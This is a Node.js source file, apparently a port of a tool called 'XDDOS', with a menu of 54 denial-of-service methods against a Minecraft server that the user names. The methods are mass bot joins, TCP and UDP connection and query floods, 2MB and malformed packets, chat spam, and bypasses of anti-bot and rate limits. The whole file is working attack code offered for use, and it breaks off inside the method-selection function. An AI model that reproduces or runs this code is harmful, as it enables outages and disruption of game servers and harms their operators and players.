"use strict";

// ==================== AUTO INSTALL ====================
const { execSync } = require('child_process');
const required = ['mineflayer', 'mineflayer-pathfinder', 'minecraft-data'];
let missing = [];
for (const m of required) {
    try { require.resolve(m); } catch { missing.push(m); }
}
if (missing.length) {
    console.log(`[INSTALL] Missing: ${missing.join(', ')}`);
    try { execSync(`npm install ${missing.join(' ')}`, { stdio: 'inherit' }); }
    catch { console.log('[INSTALL] Gagal. Coba manual: npm install mineflayer mineflayer-pathfinder minecraft-data'); process.exit(1); }
}

// ==================== IMPORTS ====================
const mineflayer = require('mineflayer');
const { pathfinder, Movements, goals } = require('mineflayer-pathfinder');
const minecraftData = require('minecraft-data');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

// ==================== GLOBAL ====================
let TARGET = { host: '', port: 25565, version: '1.21.4' };
let METHOD = '';
let attackRunning = false;
let attackTimeout = null;
let bots = [];
let stats = { packets: 0, bots: 0, errors: 0, startTime: 0 };

// ==================== ALL 54 METHODS ====================
const METHODS = {
    'join':             { cat: 'bot',  fn: 'joinFlood' },
    'doublejoin':       { cat: 'bot',  fn: 'doubleJoin' },
    'extremejoin':      { cat: 'bot',  fn: 'extremeJoin' },
    'botjoiner':        { cat: 'bot',  fn: 'botJoiner' },
    'botraid':          { cat: 'bot',  fn: 'botRaid' },
    'pingjoin':         { cat: 'bot',  fn: 'pingJoin' },
    'legitnamejoin':    { cat: 'bot',  fn: 'legitnameJoin' },
    'xdjoin':           { cat: 'bot',  fn: 'xdJoin' },
    'ping':             { cat: 'ping', fn: 'pingFlood' },
    'nullping':         { cat: 'ping', fn: 'nullPing' },
    'newnullping':      { cat: 'ping', fn: 'newNullPing' },
    'legacyping':       { cat: 'ping', fn: 'legacyPing' },
    'bigpacket':        { cat: 'ping', fn: 'bigPacket' },
    'emptypacket':      { cat: 'ping', fn: 'emptyPacket' },
    'serverfucker':     { cat: 'crash',fn: 'serverFucker' },
    'memory':           { cat: 'crash',fn: 'memoryFlood' },
    'ram':              { cat: 'crash',fn: 'ramFlood' },
    'cpudowner':        { cat: 'crash',fn: 'cpuDowner' },
    'nettydowner':      { cat: 'crash',fn: 'nettyDowner' },
    'instantdowner':    { cat: 'crash',fn: 'instantDowner' },
    'bungeedowner':     { cat: 'crash',fn: 'bungeeDowner' },
    'waterfallbypass':  { cat: 'crash',fn: 'waterfallBypass' },
    'extremekiller':    { cat: 'player',fn:'extremeKiller' },
    'ultimatekiller':   { cat: 'player',fn:'ultimateKiller' },
    'ultimatesmasher':  { cat: 'player',fn:'ultimateSmasher' },
    'slapper':          { cat: 'player',fn:'slapper' },
    'bighandshake':     { cat: 'net',  fn: 'bigHandshake' },
    'handshake':        { cat: 'net',  fn: 'handshakeFlood' },
    'emptynames':       { cat: 'net',  fn: 'emptyNames' },
    'invalidnames':     { cat: 'net',  fn: 'invalidNames' },
    'longnames':        { cat: 'net',  fn: 'longNames' },
    'longhost':         { cat: 'net',  fn: 'longHost' },
    'localhost':        { cat: 'net',  fn: 'localHostFlood' },
    'ipspoof':          { cat: 'net',  fn: 'ipSpoofFlood' },
    'tcpbypass':        { cat: 'net',  fn: 'tcpBypass' },
    'tcphit':           { cat: 'net',  fn: 'tcpHit' },
    'chatspam':         { cat: 'chat', fn: 'chatSpam' },
    'xdspam':           { cat: 'chat', fn: 'xdSpam' },
    'motd':             { cat: 'chat', fn: 'motdFlood' },
    'colorcrasher':     { cat: 'chat', fn: 'colorCrasher' },
    'invaliddata':      { cat: 'data', fn: 'invalidData' },
    'invalidspoof':     { cat: 'data', fn: 'invalidSpoof' },
    'randompacket':     { cat: 'data', fn: 'randomPacket' },
    'randomexceptions': { cat: 'data', fn: 'randomExceptions' },
    'quitexceptions':   { cat: 'data', fn: 'quitExceptions' },
    'unexpectedpacket': { cat: 'data', fn: 'unexpectedPacket' },
    'uuidcrash':        { cat: 'spec', fn: 'uuidCrash' },
    'spoof':            { cat: 'spec', fn: 'spoofFlood' },
    'smartbot':         { cat: 'spec', fn: 'smartBot' },
    'network':          { cat: 'spec', fn: 'networkFlood' },
    'query':            { cat: 'spec', fn: 'queryFlood' },
    'queue':            { cat: 'spec', fn: 'queueFlood' },
    'yoonikscry':       { cat: 'spec', fn: 'yooniksCry' },
    'nantibot':         { cat: 'spec', fn: 'nAntiBot' }
};

// ==================== UI HELPERS ====================
function banner() {
    console.clear();
    console.log('╔══════════════════════════════════════════╗');
    console.log('║        XDDOS NODE.JS PORT               ║');
    console.log('║        Full 54 Methods                  ║');
    console.log('╚══════════════════════════════════════════╝\n');
}

function showMethods() {
    console.log('╔══════════════════════════════════════════════╗');
    console.log('║             54 METHODS LIST                 ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🔴 JOIN/BOT FLOODS (8)                      ║');
    console.log('║   join, doublejoin, extremejoin, botjoiner   ║');
    console.log('║   botraid, pingjoin, legitnamejoin, xdjoin   ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🟡 PING FLOODS (6)                          ║');
    console.log('║   ping, nullping, newnullping, legacyping    ║');
    console.log('║   bigpacket, emptypacket                    ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🔵 SERVER CRASHERS (8)                      ║');
    console.log('║   serverfucker, memory, ram, cpudowner       ║');
    console.log('║   nettydowner, instantdowner, bungeedowner   ║');
    console.log('║   waterfallbypass                           ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🟣 PLAYER ATTACKS (4)                       ║');
    console.log('║   extremekiller, ultimatekiller              ║');
    console.log('║   ultimatesmasher, slapper                  ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🟠 NETWORK/PROTOCOL (10)                    ║');
    console.log('║   bighandshake, handshake, emptynames        ║');
    console.log('║   invalidnames, longnames, longhost          ║');
    console.log('║   localhost, ipspoof, tcpbypass, tcphit      ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🟢 CHAT/UI (4)                              ║');
    console.log('║   chatspam, xdspam, motd, colorcrasher       ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🟤 DATA/PACKET (6)                          ║');
    console.log('║   invaliddata, invalidspoof, randompacket    ║');
    console.log('║   randomexceptions, quitexceptions           ║');
    console.log('║   unexpectedpacket                          ║');
    console.log('╠══════════════════════════════════════════════╣');
    console.log('║ 🟣 SPECIALIZED (8)                          ║');
    console.log('║   uuidcrash, spoof, smartbot, network        ║');
    console.log('║   query, queue, yoonikscry, nantibot         ║');
    console.log('╚══════════════════════════════════════════════╝\n');
}

// ==================== BOT FACTORY ====================
function createBot(username, version) {
    return mineflayer.createBot({
        host: TARGET.host,
        port: TARGET.port,
        username: username,
        version: version || TARGET.version,
        auth: 'offline',
        hideErrors: true,
        connectTimeout: 8000
    });
}

// ==================== ATTACK FUNCTIONS ====================

// 🔴 JOIN/BOT FLOODS
async function joinFlood(count = 100, duration = 30) {
    console.log(`[join] Launching ${count} bots...`);
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`Join_${i}`);
        bot.once('spawn', () => { stats.bots++; });
        bot.on('error', () => { stats.errors++; });
        bots.push(bot);
        if (i % 20 === 0) await sleep(100);
    }
}

async function doubleJoin(count = 50) {
    console.log(`[doublejoin] ${count} bots join 2x...`);
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot1 = createBot(`DJ_${i}_1`);
        const bot2 = createBot(`DJ_${i}_2`);
        bot1.once('spawn', () => stats.bots++);
        bot2.once('spawn', () => stats.bots++);
        bot1.on('error', () => stats.errors++);
        bot2.on('error', () => stats.errors++);
        bots.push(bot1, bot2);
        await sleep(50);
    }
}

async function extremeJoin(count = 500) {
    console.log(`[extremejoin] ${count} bots paralel...`);
    stats.startTime = Date.now();
    const promises = [];
    for (let i = 0; i < count && attackRunning; i++) {
        promises.push(new Promise(r => {
            const bot = createBot(`EX_${i}`);
            bot.once('spawn', () => { stats.bots++; r(); });
            bot.on('error', () => { stats.errors++; r(); });
            bots.push(bot);
        }));
    }
    await Promise.all(promises);
}

async function botJoiner(count = 50) {
    console.log(`[botjoiner] ${count} bots + auto command...`);
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`BJ_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            bot.chat('/help');
            bot.setControlState('jump', true);
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(200);
    }
}

async function botRaid(count = 30) {
    console.log(`[botraid] ${count} bots + chat + ping...`);
    stats.startTime = Date.now();
    joinFlood(count, 0);
    setTimeout(() => chatSpam(count), 2000);
    setTimeout(() => pingFlood(1000, 0), 1000);
}

async function pingJoin(count = 50) {
    console.log(`[pingjoin] ${count} bots ping + join...`);
    stats.startTime = Date.now();
    pingFlood(500, 0);
    joinFlood(count, 0);
}

async function legitnameJoin(count = 30) {
    const names = ['DarkShadow', 'xX_Pro_Xx', 'AestheticGirl', 'NightFury', 'DiamondKing'];
    console.log(`[legitnamejoin] ${count} bots nama realistis...`);
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const name = names[i % names.length] + '_' + Math.floor(Math.random() * 1000);
        const bot = createBot(name);
        bot.once('spawn', () => stats.bots++);
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(300);
    }
}

async function xdJoin(count = 30) {
    console.log(`[xdjoin] ${count} bots UUID Xbox...`);
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`XD_${i}_${crypto.randomBytes(4).toString('hex')}`);
        bot.once('spawn', () => stats.bots++);
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(200);
    }
}

// 🟡 PING FLOODS
async function pingFlood(count = 5000, duration = 30) {
    console.log(`[ping] ${count} pings/detik...`);
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        for (let i = 0; i < Math.min(count, 100); i++) {
            const s = new net.Socket();
            s.connect(TARGET.port, TARGET.host, () => { s.destroy(); stats.packets++; });
            s.on('error', () => { s.destroy(); stats.errors++; });
        }
        await sleep(100);
    }
}

async function nullPing(duration = 30) {
    console.log('[nullping] Ping data kosong...');
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x00])); // Packet ID kosong
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

async function newNullPing(duration = 30) {
    console.log('[newnullping] UTF-16 encoding...');
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from('\x00\x00', 'utf16le'));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

async function legacyPing(duration = 30) {
    console.log('[legacyping] Format 1.7.10...');
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0xFE, 0x01])); // Legacy ping
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

async function bigPacket(duration = 30) {
    console.log('[bigpacket] 2MB packet...');
    stats.startTime = Date.now();
    const big = Buffer.alloc(2097152, 'A');
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(big);
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(100);
    }
}

async function emptyPacket(duration = 30) {
    console.log('[emptypacket] Packet tanpa payload...');
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.alloc(0));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

// 🔵 SERVER CRASHERS
async function serverFucker(duration = 30) {
    console.log('[serverfucker] ALL VECTORS...');
    stats.startTime = Date.now();
    extremeJoin(200);
    memoryFlood(duration);
    nullPing(duration);
    bigPacket(duration);
    chatSpam(50);
}

async function memoryFlood(duration = 30) {
    console.log('[memory] Memory leak...');
    stats.startTime = Date.now();
    for (let i = 0; i < 20 && attackRunning; i++) {
        const bot = createBot(`MEM_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            // Spam chat panjang
            const spam = setInterval(() => {
                bot.chat('A'.repeat(10000));
            }, 100);
            setTimeout(() => clearInterval(spam), duration * 1000);
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(500);
    }
}

async function ramFlood(duration = 30) {
    console.log('[ram] RAM allocation...');
    stats.startTime = Date.now();
    for (let i = 0; i < 30 && attackRunning; i++) {
        const bot = createBot(`RAM_${i}`);
        bot.once('spawn', () => { stats.bots++; });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(300);
    }
}

async function cpuDowner(duration = 30) {
    console.log('[cpudowner] Heavy encryption...');
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        for (let i = 0; i < 50; i++) {
            const s = new net.Socket();
            s.connect(TARGET.port, TARGET.host, () => {
                const data = crypto.randomBytes(1024);
                s.write(data);
                s.destroy();
                stats.packets++;
            });
            s.on('error', () => { s.destroy(); stats.errors++; });
        }
        await sleep(50);
    }
}

async function nettyDowner(duration = 30) {
    console.log('[nettydowner] Malformed packets...');
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0xFF, 0xFF, 0xFF, 0xFF]));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

async function instantDowner(count = 100) {
    console.log('[instantdowner] Invalid login...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`ID_${i}`, '0.0.0');
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(30);
    }
}

async function bungeeDowner(count = 500) {
    console.log('[bungeedowner] Server switch flood...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x00, 0x00, 0x00, 0x01, 0x01])); // Switch server
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

async function waterfallBypass(count = 500) {
    console.log('[waterfallbypass] Fragmented packets...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const parts = [Buffer.from([0x00, 0x00]), Buffer.from([0x00, 0x01, 0x01])];
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            parts.forEach(p => s.write(p));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

// 🟣 PLAYER ATTACKS
async function extremeKiller(count = 100) {
    console.log('[extremekiller] Invalid player move...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from('NaN NaN NaN')); // Invalid coordinates
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

async function ultimateKiller(count = 50) {
    console.log('[ultimatekiller] Multi-vector player attack...');
    extremeKiller(count);
    chatSpam(count);
}

async function ultimateSmasher(count = 50) {
    console.log('[ultimatesmasher] Kick + client crash...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(crypto.randomBytes(2048)); // Oversized packet
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(20);
    }
}

async function slapper(count = 100) {
    console.log('[slapper] Fake attack all players...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x02, 0x00, 0x00, 0x00])); // Attack entity
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

// 🟠 NETWORK/PROTOCOL
async function bigHandshake(count = 100) {
    console.log('[bighandshake] 2MB handshake...');
    stats.startTime = Date.now();
    const big = 'A'.repeat(2097152);
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from(big));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(50);
    }
}

async function handshakeFlood(count = 200) {
    console.log('[handshake] Malformed...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0xFF, 0xFE, 0xFD]));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

async function emptyNames(count = 50) {
    console.log('[emptynames] Empty username...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot('');
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(100);
    }
}

async function invalidNames(count = 50) {
    console.log('[invalidnames] Null byte username...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`Player\x00HACKED_${i}`);
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(100);
    }
}

async function longNames(count = 50) {
    console.log('[longnames] 1000 char username...');
    stats.startTime = Date.now();
    const long = 'A'.repeat(1000);
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(long + i);
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(200);
    }
}

async function longHost(count = 50) {
    console.log('[longhost] 5000 char hostname...');
    stats.startTime = Date.now();
    const long = 'B'.repeat(5000);
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from(long));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(100);
    }
}

async function localHostFlood(count = 100) {
    console.log('[localhost] Spoof 127.0.0.1...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, '127.0.0.1', () => {
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

async function ipSpoofFlood(count = 100) {
    console.log('[ipspoof] Random IP...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const ip = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

async function tcpBypass(count = 500) {
    console.log('[tcpbypass] Fragmented packets...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const parts = [Buffer.from([0x00]), Buffer.from([0x01]), Buffer.from([0x02])];
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            parts.forEach(p => s.write(p));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(2);
    }
}

async function tcpHit(count = 200) {
    console.log('[tcphit] SYN+FIN...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

// 🟢 CHAT/UI
async function chatSpam(count = 50) {
    console.log(`[chatspam] ${count} bots spam chat...`);
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`CS_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            setInterval(() => {
                if (attackRunning && bot.entity) {
                    bot.chat(crypto.randomBytes(256).toString('hex'));
                }
            }, 100);
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(100);
    }
}

async function xdSpam(count = 30) {
    console.log('[xdspam] Xbox format spam...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`XDSPAM_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            setInterval(() => {
                if (attackRunning && bot.entity) bot.chat('xD '.repeat(100));
            }, 100);
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(200);
    }
}

async function motdFlood(count = 5000) {
    console.log('[motd] MOTD request flood...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x00, 0x00, 0x00, 0x00, 0x01]));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(2);
    }
}

async function colorCrasher(count = 50) {
    console.log('[colorcrasher] Illegal color codes...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`CC_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            setInterval(() => {
                if (attackRunning && bot.entity) {
                    bot.chat('§k§l§m§n§o§r'.repeat(50));
                }
            }, 100);
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(200);
    }
}

// 🟤 DATA/PACKET
async function invalidData(count = 200) {
    console.log('[invaliddata] Bad checksum...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(crypto.randomBytes(128));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

async function invalidSpoof(count = 200) {
    console.log('[invalidspoof] Fake signature...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x00, 0x00, 0x00, 0x01, ...crypto.randomBytes(64)]));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(10);
    }
}

async function randomPacket(count = 500) {
    console.log('[randompacket] Random opcode...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([Math.floor(Math.random() * 256)]));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(2);
    }
}

async function randomExceptions(count = 100) {
    console.log('[randomexceptions] Trigger random errors...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`RE_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            // Trigger multiple errors
            bot._client.write('unknown_packet', {});
            bot.chat('\x00');
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(100);
    }
}

async function quitExceptions(count = 100) {
    console.log('[quitexceptions] Join-Error-Quit loop...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`QE_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            bot.quit();
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(200);
    }
}

async function unexpectedPacket(count = 200) {
    console.log('[unexpectedpacket] Wrong sequence...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x03, 0x00, 0x00])); // Chat packet before login
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

// 🟣 SPECIALIZED
async function uuidCrash(count = 50) {
    console.log('[uuidcrash] Invalid UUID...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`UUID_${i}`);
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(200);
    }
}

async function spoofFlood(count = 200) {
    console.log('[spoof] Identity spoof...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x00, 0x00, ...crypto.randomBytes(16)]));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(5);
    }
}

async function smartBot(count = 10) {
    console.log('[smartbot] Adaptive bots...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`SMART_${i}`);
        bot.once('spawn', () => stats.bots++);
        bot.on('kicked', () => {
            stats.errors++;
            if (attackRunning) {
                setTimeout(() => {
                    const newBot = createBot(`SMART_${i}_${Date.now()}`);
                    newBot.once('spawn', () => stats.bots++);
                    newBot.on('error', () => stats.errors++);
                    bots.push(newBot);
                }, 2000);
            }
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(500);
    }
}

async function networkFlood(duration = 30) {
    console.log('[network] TCP SYN flood...');
    stats.startTime = Date.now();
    const end = Date.now() + duration * 1000;
    while (Date.now() < end && attackRunning) {
        for (let i = 0; i < 100; i++) {
            const s = new net.Socket();
            s.connect(TARGET.port, TARGET.host, () => { s.destroy(); stats.packets++; });
            s.on('error', () => { s.destroy(); stats.errors++; });
        }
        await sleep(10);
    }
}

async function queryFlood(count = 5000) {
    console.log('[query] UDP query flood...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const client = dgram.createSocket('udp4');
        const msg = Buffer.from([0xFE, 0xFD, 0x09, 0x00, 0x00, 0x00, 0x00]);
        client.send(msg, TARGET.port, TARGET.host, () => { client.close(); stats.packets++; });
        client.on('error', () => { client.close(); stats.errors++; });
        await sleep(2);
    }
}

async function queueFlood(count = 100) {
    console.log('[queue] Queue stuck...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            // Kirim handshake tapi jangan selesaiin login
            s.write(Buffer.from([0x00, 0x00, 0x00, 0x00]));
            // Biarin koneksi menggantung
            setTimeout(() => { s.destroy(); stats.packets++; }, 30000);
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(200);
    }
}

async function yooniksCry(count = 50) {
    console.log('[yoonikscry] Paper/Spigot exploit...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const s = new net.Socket();
        s.connect(TARGET.port, TARGET.host, () => {
            s.write(Buffer.from([0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF]));
            s.destroy();
            stats.packets++;
        });
        s.on('error', () => { s.destroy(); stats.errors++; });
        await sleep(20);
    }
}

async function nAntiBot(count = 30) {
    console.log('[nantibot] Anti-bot bypass...');
    stats.startTime = Date.now();
    for (let i = 0; i < count && attackRunning; i++) {
        const bot = createBot(`NAB_${i}`);
        bot.once('spawn', () => {
            stats.bots++;
            // Simulate natural movement
            setInterval(() => {
                if (attackRunning && bot.entity) {
                    bot.setControlState('forward', true);
                    setTimeout(() => bot.setControlState('forward', false), 500);
                }
            }, 3000);
        });
        bot.on('error', () => stats.errors++);
        bots.push(bot);
        await sleep(1000); // Join slowly to bypass rate limit
    }
}

// ==================== HELPERS ====================
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function stopAll() {
    attackRunning = false;
    if (attackTimeout) clearTimeout(attackTimeout);
    bots.forEach(b => { try { b.quit(); } catch {} });
    bots = [];
}

function showStats() {
    const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
    console.log(`\n╔══════════════════════════════════╗`);
    console.log(`║  📊 STATS                       ║`);
    console.log(`║  ⏱️  ${elapsed}s                    ║`);
    console.log(`║  📦 Packets: ${stats.packets}`);
    console.log(`║  🤖 Bots: ${stats.bots}`);
    console.log(`║  ❌ Errors: ${stats.errors}`);
    console.log(`╚══════════════════════════════════╝\n`);
}

// ==================== MAIN MENU ====================
async function main() {
    banner();
    
    rl.question('🎯 TARGET IP/HOST: ', (host) => {
        TARGET.host = host.trim();
        if (!TARGET.host) { console.log('[!] Target required!'); process.exit(1); }
        
        rl.question('🔌 PORT [25565]: ', (port) => {
            TARGET.port = parseInt(port) || 25565;
            
            showMethods();
            
            console.log('📋 Ketik nama method (contoh: join, nullping, serverfucker)');
            console.log('📋 Atau ketik "list" untuk lihat lagi metode');
            console.log('📋 Atau ketik "exit" untuk keluar\n');
            
            askMethod();
        });
    });
}

function askMethod() {
    rl.question('⚔️  METHOD: ', async (method) => {
        const m = method.toLowerCase().trim();
        
